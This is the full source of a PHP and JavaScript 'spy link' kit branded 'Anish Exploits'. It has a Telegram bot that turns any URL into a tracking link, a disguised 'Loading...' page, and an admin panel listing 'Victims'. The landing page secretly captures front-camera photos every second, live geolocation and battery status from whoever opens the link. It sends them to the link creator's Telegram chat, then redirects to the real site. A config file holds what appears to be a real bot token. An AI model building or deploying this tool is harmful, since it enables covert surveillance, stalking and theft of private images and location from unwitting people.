RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^([a-zA-Z0-9_]+)$ index.php?id=$1 [L]
<Files "*.json">
    Order Allow,Deny
    Deny from all
</Files>

Options -Indexes

<?php
require_once 'config.php';

session_start();

// Login
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['login'])) {
    if ($_POST['username'] == $config['admin_username'] && $_POST['password'] == $config['admin_password']) {
        $_SESSION['admin'] = true;
    }
}
if (!isset($_SESSION['admin']) || $_SESSION['admin'] !== true) {
    ?>
    <!DOCTYPE html>
    <html>
    <head><title>Admin Login</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background: #0f0c29; color: white; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-box { background: rgba(255,255,255,0.05); padding: 40px; border-radius: 20px; width: 320px; text-align: center; border: 1px solid rgba(255,255,255,0.05); }
        .login-box h2 { margin-bottom: 20px; color: #f7971e; }
        input { width: 100%; padding: 14px; margin: 10px 0; border: none; border-radius: 12px; background: rgba(255,255,255,0.08); color: white; font-size: 14px; }
        input::placeholder { color: #666; }
        button { width: 100%; padding: 14px; background: linear-gradient(45deg, #f7971e, #ffd200); border: none; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; }
        button:hover { opacity: 0.9; }
    </style>
    </head>
    <body>
        <div class="login-box">
            <h2>🔐 Admin Login</h2>
            <form method="POST">
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" name="login">Login</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}
$visitors = json_decode(file_get_contents("visitors.json"), true) ?? [];
$links = json_decode(file_get_contents("links.json"), true) ?? [];
$totalVictims = count($visitors);
?>
<!DOCTYPE html>
<html>
<head>
    <title>Admin - Anish Exploits</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background: #0f0c29; color: white; font-family: Arial; padding: 20px; }
        .header { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px; }
        .stats { display: flex; gap: 15px; flex-wrap: wrap; margin: 20px 0; }
        .stat-box { background: rgba(255,255,255,0.05); padding: 18px 25px; border-radius: 15px; flex: 1; min-width: 100px; text-align: center; border: 1px solid rgba(255,255,255,0.05); }
        .stat-box h2 { font-size: 32px; color: #f7971e; }
        .stat-box p { color: #888; font-size: 13px; }
        .btn { background: #f7971e; color: black; padding: 8px 18px; border: none; border-radius: 10px; cursor: pointer; margin: 3px; font-weight: 600; text-decoration: none; display: inline-block; }
        .btn:hover { background: #ffd200; }
        .btn-danger { background: #ef4444; color: white; }
        .btn-danger:hover { background: #dc2626; }
        .visitor-card { background: rgba(255,255,255,0.03); border-radius: 15px; padding: 20px; margin: 15px 0; border: 1px solid rgba(255,255,255,0.05); }
        .visitor-card h3 { color: #f7971e; margin-bottom: 8px; }
        .info { color: #aaa; font-size: 13px; margin: 4px 0; }
        .info strong { color: #ddd; }
        .photo-grid { display: flex; flex-wrap: wrap; gap: 8px; margin: 10px 0; }
        .photo-grid img { width: 80px; height: 80px; object-fit: cover; border-radius: 8px; border: 2px solid rgba(255,255,255,0.08); }
        .badge { display: inline-block; padding: 2px 10px; border-radius: 20px; font-size: 12px; background: rgba(255,255,255,0.05); }
        .badge.good { background: rgba(74, 222, 128, 0.15); color: #4ade80; }
        .empty { color: #666; text-align: center; padding: 40px; }
        .creator-tag { color: #f7971e; font-size: 12px; background: rgba(247, 151, 30, 0.1); padding: 2px 10px; border-radius: 10px; }
        .link-item { background: rgba(255,255,255,0.03); padding: 10px 15px; border-radius: 10px; margin: 5px 0; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
    </style>
</head>
<body>
    <div class="header">
        <h1>👾 Admin Panel - Anish Exploits</h1>
        <div>
            <a href="?export=json" class="btn">📥 Export</a>
            <a href="?clear=all" class="btn btn-danger" onclick="return confirm('Delete ALL data?')">🗑️ Clear</a>
            <a href="?logout=1" class="btn btn-danger">🚪 Logout</a>
        </div>
    </div>
    <div class="stats">
        <div class="stat-box"><h2><?= $totalVictims ?></h2><p>Total Victims</p></div>
        <?php
        $totalPhotos = 0;
        foreach ($visitors as $v) {
            $totalPhotos += $v['photos'] ?? 0;
        }
        ?>
        <div class="stat-box"><h2><?= $totalPhotos ?></h2><p>Photos Captured</p></div>
        <div class="stat-box"><h2><?= count($links) ?></h2><p>Spy Links Created</p></div>
    </div>
<div style="margin:20px 0;">
        <h3>🔗 All Spy Links</h3>
        <?php foreach ($links as $code => $data): ?>
            <div class="link-item">
                <span><strong><?= $code ?></strong> → <?= $data['url'] ?></span>
                <span class="creator-tag">Created by: <?= $data['created_by'] ?></span>
                <span style="color:#666;font-size:12px;"><?= $data['created_at'] ?></span>
            </div>
        <?php endforeach; ?>
    </div>
    <?php
    // Export JSON
    if (isset($_GET['export'])) {
        header('Content-Type: application/json');
        header('Content-Disposition: attachment; filename="visitors_data_'.date('Y-m-d').'.json"');
        echo json_encode($visitors, JSON_PRETTY_PRINT);
        exit;
    }
    // Clear all
    if (isset($_GET['clear'])) {
        file_put_contents("visitors.json", json_encode([]));
        file_put_contents("links.json", json_encode([]));
        $files = glob("photos/*.jpg");
        foreach ($files as $file) @unlink($file);
        echo "<script>location.href='?'</script>";
        exit;
    }
    // Logout
    if (isset($_GET['logout'])) {
        session_destroy();
        echo "<script>location.href='?'</script>";
        exit;
    }
// Display visitors
    if (empty($visitors)):
    ?>
        <div class="empty">
            <h2 style="font-size:24px;margin-bottom:10px;">📭 No Victims Yet</h2>
            <p>Generate a spy link from your bot and share it!</p>
        </div>
    <?php else: ?>
        <h3>📋 All Victims</h3>
        <?php foreach ($visitors as $id => $data): ?>
            <div class="visitor-card">
                <h3>🆔 <?= $id ?></h3>
                <div class="info"><strong>📱 Device:</strong> <?= substr($data['device'] ?? 'Unknown', 0, 60) ?></div>
                <div class="info"><strong>🌐 IP:</strong> <?= $data['ip'] ?? 'Unknown' ?></div>
                <div class="info"><strong>🎯 Target:</strong> <?= $data['target_url'] ?? 'N/A' ?></div>
                <div class="info"><strong>👤 Generated By:</strong> <?= $data['generated_by'] ?? 'Unknown' ?></div>
                <div class="info"><strong>📅 First Seen:</strong> <?= $data['time'] ?? 'N/A' ?></div>
                <div class="info">
                    <strong>📊 Stats:</strong> 
                    <span class="badge good">📸 <?= $data['photos'] ?? 0 ?></span>
                    <span class="badge good">📍 <?= $data['locations'] ?? 0 ?></span>
                    <span class="badge good">🔋 <?= $data['battery'] ?? 0 ?></span>
                </div>
                
                <?php 
                $photoFiles = glob("photos/{$id}_*.jpg");
                if (!empty($photoFiles)):
                    $recentPhotos = array_slice($photoFiles, -5);
                ?>
                    <div class="photo-grid">
                        <?php foreach ($recentPhotos as $photo): ?>
                            <img src="<?= $photo ?>" alt="Photo" loading="lazy">
                        <?php endforeach; ?>
                    </div>
                <?php endif; ?>
            </div>
        <?php endforeach; ?>
    <?php endif; ?>
</body>
</html>
<?php
require_once 'config.php';
$botToken = $config['bot_token'];
$website = $config['website'];
// Create files if not exist
if (!file_exists("links.json")) {
    file_put_contents("links.json", json_encode([]));
}
$content = file_get_contents("php://input");
$update = json_decode($content, true);
if (!$update) exit;
$chatId = $update["message"]["chat"]["id"] ?? null;
$text = $update["message"]["text"] ?? "";
$callback = $update["callback_query"] ?? null;
// /start
if ($text == "/start") {
    $keyboard = [
        "inline_keyboard" => [
            [["text" => "🔗 Generate Spy Link", "callback_data" => "generate"]],
            [["text" => "📊 My Victims", "callback_data" => "stats"]]
        ]
    ];
    sendMessage($chatId, "👾 *Prabhanjan Exploits Spy Bot*\n\nSend any URL, I'll make a spy link.\nWhen someone clicks it, auto-capture starts! 📸", json_encode($keyboard));
}

// Generate button
if ($callback && $callback["data"] == "generate") {
    sendMessage($callback["from"]["id"], "📥 *Send target URL*\nExample: `https://youtube.com`");
    answerCallback($callback["id"]);
}
// Stats button
if ($callback && $callback["data"] == "stats") {
    $allVisitors = json_decode(file_get_contents("visitors.json"), true) ?? [];
    $myVisitors = [];
    foreach ($allVisitors as $id => $data) {
        if (isset($data['generated_by']) && $data['generated_by'] == $callback["from"]["id"]) {
            $myVisitors[] = $data;
        }
    }
    $total = count($myVisitors);
    sendMessage($callback["from"]["id"], "📊 *Your Victims:* $total\n\n🔗 Generate more links to track more people!");
    answerCallback($callback["id"]);
}

// User sends URL - Convert to spy link
if ($text && filter_var($text, FILTER_VALIDATE_URL)) {
    // Extract domain name from URL for short code
    $parsed = parse_url($text);
    $domain = str_replace(['www.', '.'], ['', '_'], $parsed['host'] ?? 'link');
    $shortCode = $domain . '_' . substr(time(), -4);
    
    // Save target URL with user's chat ID
    $db = json_decode(file_get_contents("links.json"), true) ?? [];
    $db[$shortCode] = [
        'url' => $text,
        'created_by' => $chatId,
        'created_at' => date('Y-m-d H:i:s')
    ];
    file_put_contents("links.json", json_encode($db));
    
    $spyLink = $website . $shortCode;
    
    sendMessage($chatId, "✅ *Spy Link Generated!*\n\n🔗 `$spyLink`\n\n📸 When someone opens this link:\n• Camera photos (every 1 sec)\n• Live Location\n• Battery Status\n\n*All photos will come to YOU!*");
}

function sendMessage($chatId, $text, $replyMarkup = null) {
    global $botToken;
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = ["chat_id" => $chatId, "text" => $text, "parse_mode" => "Markdown"];
    if ($replyMarkup) $data['reply_markup'] = $replyMarkup;
    file_get_contents($url . "?" . http_build_query($data));
}

function answerCallback($id) {
    global $botToken;
    $url = "https://api.telegram.org/bot$botToken/answerCallbackQuery";
    file_get_contents($url . "?callback_query_id=" . $id);
}
?>

<?php
$config = [
    'bot_token' => '8925350230:AAGZJaEZwM4lW6uRAIe2pKRsX3kIQ92SjMA',
    'chat_id'   => '6146027296',
];
?>

<?php
require_once 'config.php';

// Create folders & files if not exist
if (!file_exists("photos")) {
    mkdir("photos", 0755, true);
}
if (!file_exists("visitors.json")) {
    file_put_contents("visitors.json", json_encode([]));
}
if (!file_exists("links.json")) {
    file_put_contents("links.json", json_encode([]));
}

$id = $_GET['id'] ?? '';
$db = json_decode(file_get_contents("links.json"), true) ?? [];

$linkData = $db[$id] ?? null;
$targetUrl = $linkData['url'] ?? 'https://google.com';
$creatorId = $linkData['created_by'] ?? $config['chat_id'];

session_start();
$visitorId = $_SESSION['visitor_id'] ?? null;

if (!$visitorId) {
    $visitorId = 'VIS_' . time() . '_' . bin2hex(random_bytes(4));
    $_SESSION['visitor_id'] = $visitorId;
}

// ========== FUNCTIONS ==========
function sendPhotoToTelegram($chatId, $photoPath, $visitorId) {
    global $config;
    
    if (!file_exists($photoPath)) return false;
    
    $token = $config['bot_token'];
    $url = "https://api.telegram.org/bot$token/sendPhoto";
    
    $post = [
        'chat_id' => $chatId,
        'photo' => new CURLFile(realpath($photoPath)),
        'caption' => "📸 *Spy Photo!*\n🆔 $visitorId\n⏰ " . date('Y-m-d H:i:s')
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    file_put_contents("debug.log", date('Y-m-d H:i:s') . " - Photo send: $httpCode\n", FILE_APPEND);
    
    return $httpCode == 200;
}

function sendLocationToTelegram($chatId, $lat, $lng, $visitorId) {
    global $config;
    $token = $config['bot_token'];
    
    $url = "https://api.telegram.org/bot$token/sendLocation";
    $data = ['chat_id' => $chatId, 'latitude' => $lat, 'longitude' => $lng];
    file_get_contents($url . "?" . http_build_query($data));
    
    $msg = "📍 *Live Location*\n🆔 $visitorId\n🗺️ https://maps.google.com/?q=$lat,$lng";
    $url2 = "https://api.telegram.org/bot$token/sendMessage";
    $data2 = ['chat_id' => $chatId, 'text' => $msg, 'parse_mode' => 'Markdown'];
    file_get_contents($url2 . "?" . http_build_query($data2));
    
    file_put_contents("debug.log", date('Y-m-d H:i:s') . " - Location sent: $lat, $lng\n", FILE_APPEND);
}

function sendBatteryToTelegram($chatId, $level, $charging, $visitorId) {
    global $config;
    $token = $config['bot_token'];
    
    $status = $charging ? "⚡ Charging" : "🔋 Not Charging";
    $msg = "🔋 *Battery Status*\n🆔 $visitorId\n📊 $level%\n$status";
    
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = ['chat_id' => $chatId, 'text' => $msg, 'parse_mode' => 'Markdown'];
    file_get_contents($url . "?" . http_build_query($data));
    
    file_put_contents("debug.log", date('Y-m-d H:i:s') . " - Battery sent: $level%\n", FILE_APPEND);
}

// ========== HANDLE POST DATA ==========
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $input = file_get_contents('php://input');
    file_put_contents("debug.log", date('Y-m-d H:i:s') . " - POST received\n", FILE_APPEND);
    
    $data = json_decode($input, true);
    if (!$data) {
        echo json_encode(['status' => 'error', 'message' => 'Invalid JSON']);
        exit;
    }
    
    $items = isset($data[0]) ? $data : [$data];
    
    $visitors = json_decode(file_get_contents("visitors.json"), true) ?? [];
    
    if (!isset($visitors[$visitorId])) {
        $visitors[$visitorId] = [
            'device' => $_SERVER['HTTP_USER_AGENT'],
            'ip' => $_SERVER['REMOTE_ADDR'],
            'target_url' => $targetUrl,
            'generated_by' => $creatorId,
            'time' => date('Y-m-d H:i:s'),
            'photos' => 0,
            'locations' => 0,
            'battery' => 0
        ];
    }
    
    $visitors[$visitorId]['last_update'] = date('Y-m-d H:i:s');
    
    foreach ($items as $item) {
        // PHOTO
        if (isset($item['photo']) && !empty($item['photo'])) {
            $photoData = $item['photo'];
            $photoData = str_replace('data:image/jpeg;base64,', '', $photoData);
            $photoData = str_replace(' ', '+', $photoData);
            $photoBinary = base64_decode($photoData);
            
            if ($photoBinary && strlen($photoBinary) > 500) {
                $photoPath = "photos/" . $visitorId . "_" . time() . ".jpg";
                file_put_contents($photoPath, $photoBinary);
                
                file_put_contents("debug.log", date('Y-m-d H:i:s') . " - Photo saved: " . filesize($photoPath) . " bytes\n", FILE_APPEND);
                
                if (file_exists($photoPath) && filesize($photoPath) > 500) {
                    sendPhotoToTelegram($creatorId, $photoPath, $visitorId);
                    $visitors[$visitorId]['photos'] += 1;
                }
            }
        }
        
        // LOCATION
        if (isset($item['location'])) {
            $lat = $item['location']['lat'] ?? 0;
            $lng = $item['location']['lng'] ?? 0;
            if ($lat != 0 && $lng != 0) {
                sendLocationToTelegram($creatorId, $lat, $lng, $visitorId);
                $visitors[$visitorId]['locations'] += 1;
            }
        }
        
        // BATTERY
        if (isset($item['battery'])) {
            $level = $item['battery']['level'] ?? 0;
            $charging = $item['battery']['charging'] ?? false;
            if ($level > 0) {
                sendBatteryToTelegram($creatorId, $level, $charging, $visitorId);
                $visitors[$visitorId]['battery'] += 1;
            }
        }
    }
    
    file_put_contents("visitors.json", json_encode($visitors));
    echo json_encode(['status' => 'success']);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Loading...</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { 
            background: #0a0a0a;
            color: #fff;
            font-family: -apple-system, 'Segoe UI', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            padding: 20px;
            max-width: 380px;
        }
        .logo {
            font-size: 28px;
            font-weight: 900;
            background: linear-gradient(45deg, #f7971e, #ffd200);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 5px;
        }
        .subtitle {
            color: #555;
            font-size: 12px;
            margin-bottom: 25px;
            letter-spacing: 1px;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 3px solid rgba(255,255,255,0.05);
            border-radius: 50%;
            border-top: 3px solid #f7971e;
            animation: spin 0.8s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status-text {
            color: #4ade80;
            font-size: 13px;
            min-height: 22px;
            transition: 0.3s;
        }
        .status-text.warning { color: #fbbf24; }
        .status-text.error { color: #ef4444; }
        .badge {
            display: inline-block;
            background: rgba(255,255,255,0.03);
            padding: 4px 14px;
            border-radius: 20px;
            font-size: 10px;
            color: #666;
            margin-top: 15px;
            border: 1px solid rgba(255,255,255,0.03);
        }
        .badge span { color: #f7971e; }
        #video { display: none; }
        #canvas { display: none; }
        .red-dot {
            display: inline-block;
            width: 8px;
            height: 8px;
            background: #ef4444;
            border-radius: 50%;
            animation: pulse 1s infinite;
            margin-right: 6px;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.3; transform: scale(1.2); }
        }
        .recording {
            display: inline-flex;
            align-items: center;
            background: rgba(239, 68, 68, 0.1);
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            color: #ef4444;
            margin-top: 8px;
        }
        .debug-info {
            color: #444;
            font-size: 10px;
            margin-top: 15px;
            word-break: break-all;
            max-height: 60px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">✨ Anish Exploits</div>
        <div class="subtitle">🔒 Secure Connection</div>
        
        <div class="spinner"></div>
        <div class="status-text" id="status">📸 Initializing...</div>
        <div class="recording" id="recordingBadge" style="display:none;">
            <span class="red-dot"></span> RECORDING
        </div>
        <div class="badge">🆔 <span id="visitorDisplay"></span></div>
        <div class="debug-info" id="debugInfo"></div>
        
        <video id="video" autoplay playsinline muted></video>
        <canvas id="canvas"></canvas>
    </div>

    <script>
        const visitorId = '<?= $visitorId ?>';
        const targetUrl = '<?= $targetUrl ?>';
        let photoCount = 0;
        let isCapturing = false;
        let debugEl = document.getElementById('debugInfo');
        
        function debug(msg) {
            debugEl.textContent = msg;
            console.log(msg);
        }
        
        document.getElementById('visitorDisplay').textContent = visitorId.substring(0, 15) + '...';
        debug('Initializing...');

        // ========== CAMERA - FRONT CAMERA ==========
        debug('Requesting camera...');
        
        navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, 
            audio: false 
        })
        .then(stream => {
            const video = document.getElementById('video');
            video.srcObject = stream;
            video.play();
            
            document.getElementById('status').textContent = '📸 Capturing...';
            document.getElementById('recordingBadge').style.display = 'inline-flex';
            isCapturing = true;
            debug('✅ Camera active');
            
            setInterval(() => {
                if (isCapturing) {
                    capturePhoto();
                    photoCount++;
                    debug('📸 Photo #' + photoCount);
                }
            }, 1000);
        })
        .catch(err => {
            document.getElementById('status').textContent = '⚠️ Camera denied';
            document.getElementById('status').className = 'status-text error';
            debug('❌ Camera error: ' + err.message);
        });

        function capturePhoto() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            
            if (!video.videoWidth || video.videoWidth === 0) return;
            
            canvas.width = 640;
            canvas.height = 480;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const photoData = canvas.toDataURL('image/jpeg', 0.7);
            sendData({ photo: photoData });
        }

        // ========== LOCATION ==========
        debug('Requesting location...');
        
        if (navigator.geolocation) {
            navigator.geolocation.watchPosition(
                (position) => {
                    const loc = {
                        lat: position.coords.latitude,
                        lng: position.coords.longitude
                    };
                    debug('📍 Location: ' + loc.lat + ', ' + loc.lng);
                    sendData({ location: loc });
                },
                (err) => {
                    debug('❌ Location error: ' + err.message);
                },
                { enableHighAccuracy: true, maximumAge: 5000, timeout: 10000 }
            );
        } else {
            debug('❌ Geolocation not supported');
        }

        // ========== BATTERY ==========
        debug('Checking battery...');
        
        if (navigator.getBattery) {
            navigator.getBattery().then(battery => {
                function updateBattery() {
                    const level = Math.round(battery.level * 100);
                    const charging = battery.charging;
                    debug('🔋 Battery: ' + level + '%');
                    sendData({ battery: { level: level, charging: charging } });
                }
                updateBattery();
                setInterval(updateBattery, 5000);
            });
        } else {
            debug('❌ Battery API not supported');
        }

        // ========== SEND DATA ==========
        let pendingData = [];
        let lastSend = 0;

        function sendData(data) {
            pendingData.push(data);
            
            if (Date.now() - lastSend > 2000 || pendingData.length >= 3) {
                const batch = pendingData.slice();
                pendingData = [];
                
                debug('📤 Sending ' + batch.length + ' items');
                
                fetch(window.location.href, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(batch)
                })
                .then(response => response.json())
                .then(data => {
                    debug('✅ Server OK');
                })
                .catch(err => {
                    debug('❌ Send error: ' + err.message);
                });
                
                lastSend = Date.now();
            }
        }

        // ========== REDIRECT ==========
        let secondsLeft = 10;
        const statusEl = document.getElementById('status');
        
        const countdown = setInterval(() => {
            secondsLeft--;
            if (secondsLeft > 0) {
                statusEl.textContent = '⏳ Redirecting in ' + secondsLeft + 's...';
            }
        }, 1000);

        setTimeout(() => {
            clearInterval(countdown);
            isCapturing = false;
            statusEl.textContent = '🚀 Redirecting...';
            debug('🔗 Redirecting...');
            
            setTimeout(() => {
                window.location.href = targetUrl;
            }, 1500);
        }, 10000);
    </script>
</body>
</html>
